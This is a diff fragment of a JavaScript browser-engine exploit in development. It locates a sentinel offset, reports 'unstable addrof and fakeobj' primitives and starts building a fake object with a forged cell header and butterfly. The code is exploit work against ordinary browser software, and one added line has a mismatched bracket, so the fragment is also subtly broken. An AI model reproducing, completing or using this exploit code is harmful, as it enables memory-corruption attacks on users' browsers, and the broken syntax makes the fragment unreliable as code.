@@ -395,11 +395,13 @@ function iv(x){
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
+              port.postMessage(dec2f(a1[i));
               if (dec2f(a1[i]) == kSentinel) {
                 offset = i;
                 break;
               }
             }
+            /*
             if (offset == -1) {
               port.postMessage("Failure finding offset");
               return;
@@ -416,7 +418,7 @@ function iv(x){
             }
             port.postMessage("shall we proceed? we have unstable addrof and fakeobj")
 
-            /*let obj = {
+            let obj = {
               jsCellHeader: dec2f(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
